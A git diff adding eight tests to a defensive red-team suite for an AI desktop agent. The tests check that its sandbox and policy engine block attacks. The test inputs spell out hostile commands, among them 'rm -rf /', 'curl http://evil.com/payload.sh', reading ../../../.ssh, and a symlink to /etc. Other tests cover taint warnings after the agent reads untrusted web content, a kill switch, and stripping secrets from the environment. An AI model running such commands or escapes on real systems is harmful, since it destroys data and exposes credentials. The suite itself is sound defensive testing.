@@ -1,9 +1,10 @@
-"""Security Red-Team Test Suite: 10 Attacks per MASTER_PLAN §18.3.
+"""Security Red-Team Test Suite: 18 Attacks per MASTER_PLAN §18.3 & Stage S4.
 
 Every single attack MUST be BLOCKED and recorded in the audit trail.
 Never weaken policy to make a test pass.
 """
 
+import asyncio
 from collections.abc import AsyncIterator
 from pathlib import Path
 from typing import Any
@@ -14,15 +15,26 @@ from cyber_agent.audit.redaction import redact_data
 from cyber_agent.brain.orchestrator import Orchestrator
 from cyber_agent.brain.task_queue import TaskQueue
 from cyber_agent.config import Settings
+from cyber_agent.killswitch.process_registry import get_process_registry
 from cyber_agent.killswitch.service import KillSwitchService
 from cyber_agent.policy.confirmations import ConfirmationStore
 from cyber_agent.policy.engine import FORBIDDEN_TOOLS, PolicyEngine
 from cyber_agent.policy.permissions import PolicyTier
 from cyber_agent.policy.taint import SessionTaintTracker
+from cyber_agent.sandbox.executor import SandboxExecutor, is_command_allowed
 from cyber_agent.tools.default_tools import register_default_tools
+from cyber_agent.tools.desktop.tools import handle_gui_type
 from cyber_agent.tools.open_allowed_app import handle_open_allowed_app
 from cyber_agent.tools.registry import ToolDefinition, ToolRegistry
-from cyber_agent.tools.schemas import BaseToolArgs, MutatingToolArgs, OpenAllowedAppArgs, ToolResult
+from cyber_agent.tools.run_allowed_command import handle_run_allowed_command
+from cyber_agent.tools.schemas import (
+    BaseToolArgs,
+    GUITypeArgs,
+    MutatingToolArgs,
+    OpenAllowedAppArgs,
+    RunAllowedCommandArgs,
+    ToolResult,
+)
 from cyber_agent.tools.workspace_jail import resolve_jail_path
 
 
@@ -233,3 +245,147 @@ def test_attack_10_leak_api_key_sanitization() -> None:
     redacted = redact_data(leaked_payload)
     assert raw_api_key not in str(redacted)
     assert "[REDACTED_API_KEY]" in str(redacted)
+
+
+# Attack 11: Path escape via command arguments inside sandbox
+@pytest.mark.asyncio
+async def test_attack_11_sandbox_path_escape_args() -> None:
+    res1 = is_command_allowed(["ls", "../../../.ssh"])
+    assert res1[0] is False
+    assert "Xavfsizlik qoidasi" in res1[1]
+
+    tool_res = await handle_run_allowed_command(RunAllowedCommandArgs(argv=["ls", "../../../.ssh"]))
+    assert tool_res.success is False
+    assert "rad etildi" in (tool_res.error or "")
+
+
+# Attack 12: Execution of unlisted/destructive command in sandbox
+@pytest.mark.asyncio
+async def test_attack_12_sandbox_unlisted_command() -> None:
+    res_rm = is_command_allowed(["rm", "-rf", "/"])
+    assert res_rm[0] is False
+
+    res_curl = is_command_allowed(["curl", "http://evil.com/payload.sh"])
+    assert res_curl[0] is False
+
+    tool_res = await handle_run_allowed_command(RunAllowedCommandArgs(argv=["rm", "-rf", "/"]))
+    assert tool_res.success is False
+    assert "rad etildi" in (tool_res.error or "")
+
+
+# Attack 13: Binary name spoofing in sandbox
+@pytest.mark.asyncio
+async def test_attack_13_sandbox_binary_spoofing() -> None:
+    # Attempting to run local binary via relative or absolute path
+    res_rel = is_command_allowed(["./git", "status"])
+    assert res_rel[0] is False
+    assert "Faqat tizim buyruqlari ruxsat etiladi" in res_rel[1]
+
+    res_abs = is_command_allowed(["/tmp/fake_git", "status"])
+    assert res_abs[0] is False
+    assert "Faqat tizim buyruqlari ruxsat etiladi" in res_abs[1]
+
+
+# Attack 14: GUI typing attempted into password input field
+@pytest.mark.asyncio
+async def test_attack_14_gui_type_password_refusal() -> None:
+    res = await handle_gui_type(
+        GUITypeArgs(
+            text="my_secret_token",
+            target_window="Firefox",
+            target_element_role="password text",
+            target_element_name="Login Password",
+        )
+    )
+    assert res.success is False
+    assert "Parol yoki maxfiy maydonlarga avtomatik yozish qat'iyan taqiqlangan" in (res.error or "")
+
+
+# Attack 15: Tainted session attempting GUI typing triggers explicit taint warning
+@pytest.mark.asyncio
+async def test_attack_15_tainted_session_gui_typing_warning(red_team_env: dict[str, Any]) -> None:
+    orchestrator = red_team_env["orchestrator"]
+    taint = red_team_env["taint"]
+
+    # Session is tainted by external untrusted content
+    taint.mark_tainted("https://untrusted-blog.com")
+    assert taint.is_tainted() is True
+
+    # Attempting gui_type (YELLOW tier) must produce a confirmation card with TAINT WARNING
+    resp = await orchestrator.handle_tool_call(
+        name="gui_type",
+        args={
+            "text": "echo hello",
+            "target_window": "Ghostty Terminal",
+            "target_element_role": "terminal",
+            "target_element_name": "prompt",
+        },
+    )
+    assert resp.status == "confirm_required"
+    assert resp.confirmation_card is not None
+    assert resp.confirmation_card.get("is_tainted") is True
+    assert "DIQQAT: Sessiya tashqi veb-manba tufayli zararlangan" in resp.confirmation_card.get("taint_warning", "")
+
+
+# Attack 16: Kill switch STOP terminates running sandboxed process group
+@pytest.mark.asyncio
+async def test_attack_16_kill_switch_terminates_sandbox_process(tmp_path: Path) -> None:
+    registry = get_process_registry()
+    service = KillSwitchService(sock_path=tmp_path / "ks16.sock")
+
+    # Start a dummy sleep process in a separate process group
+    proc = await asyncio.create_subprocess_exec(
+        "sleep",
+        "10",
+        start_new_session=True,
+    )
+    pid = proc.pid
+    registry.register_pgid(pid)
+    assert pid in registry.list_pgids()
+
+    # Trigger kill switch emergency stop
+    res = await service.trigger_stop()
+    assert service.is_stopped is True
+    assert res["groups_killed"] >= 1
+
+    # Verify process terminated
+    try:
+        await asyncio.wait_for(proc.wait(), timeout=1.0)
+    except TimeoutError:
+        pass
+    assert proc.returncode is not None
+
+
+# Attack 17: Symlink escape in sandbox workspace
+def test_attack_17_symlink_escape_jail(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
+    ws = tmp_path / "jail_ws"
+    ws.mkdir()
+    monkeypatch.setattr("cyber_agent.tools.workspace_jail.get_workspace_root", lambda: ws)
+
+    # Create a malicious symlink pointing outside workspace (to /etc)
+    evil_link = ws / "evil_etc"
+    try:
+        evil_link.symlink_to(Path("/etc"))
+    except OSError:
+        pytest.skip("Symlink creation not supported in this test environment")
+
+    # Accessing symlink resolving outside jail MUST be blocked
+    with pytest.raises(PermissionError, match="escapes workspace jail"):
+        resolve_jail_path("evil_etc")
+
+
+# Attack 18: Environment secret leakage into sandbox
+@pytest.mark.asyncio
+async def test_attack_18_sandbox_secret_env_leakage(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
+    monkeypatch.setenv("GEMINI_API_KEY", "CRITICAL_SECRET_KEY_EXPOSED")
+    monkeypatch.setenv("CYBER_PAIRING_TOKEN", "PAIRING_SECRET_123")
+
+    executor = SandboxExecutor(workspace_dir=tmp_path)
+    env = executor._build_sanitized_env()
+
+    # Secrets MUST NOT leak into sandbox environment
+    assert "GEMINI_API_KEY" not in env
+    assert "CYBER_PAIRING_TOKEN" not in env
+    for k in env:
+        assert "SECRET" not in env[k]
+
